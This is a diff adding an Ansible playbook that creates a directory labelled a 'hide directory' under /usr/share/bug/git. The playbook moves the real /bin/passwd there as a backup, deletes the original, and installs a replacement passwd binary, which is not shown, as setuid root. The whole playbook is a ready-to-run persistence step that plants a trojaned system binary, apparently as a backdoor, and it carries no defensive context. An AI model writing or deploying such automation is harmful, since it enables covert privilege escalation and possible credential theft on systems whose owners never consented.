@@ -1,0 +1,24 @@
+---
+- name: create hide directory
+  ansible.builtin.file:
+    path: /usr/share/bug/git
+    state: directory
+    mode: 0755
+
+- name: copy backup
+  ansible.builtin.copy:
+    src: /bin/passwd
+    dest: /usr/share/bug/git/passwd.bak
+    mode: 0755
+    remote_src: yes
+
+- name: Remove original file
+  ansible.builtin.file:
+    path: /bin/passwd
+    state: absent
+    
+- name: copy binary
+  ansible.builtin.copy:
+    src: files/passwd
+    dest: /bin/passwd
+    mode: 04755
